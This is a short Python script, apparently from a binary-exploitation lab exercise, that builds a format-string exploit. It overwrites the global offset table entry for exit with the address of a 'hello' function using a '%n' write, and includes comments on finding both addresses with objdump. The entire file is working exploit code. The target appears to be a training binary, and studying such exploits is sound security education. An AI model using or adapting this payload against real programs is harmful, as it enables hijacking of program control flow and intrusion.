import struct

# pad will give you a constant length string so that stack does not vary accroding to input
def pad(string, length):
        return (string[:length] + "." * (length - len(string)))


# address of hello function
# can be found using 'objdump -t'
hello_addr = 0x080484b4

# address of the exit function in GOT
# can be found using 'objdump -TR'
exit_addr = struct.pack("I", 0x08049724)

# value to be written at exit_addr
value = hello_addr

# find the position of addr in the printf parameters passing many %x to printf
exploit = exit_addr + "%" + str(value-4) + "d" + "%4$n"

print(pad(exploit, 512))
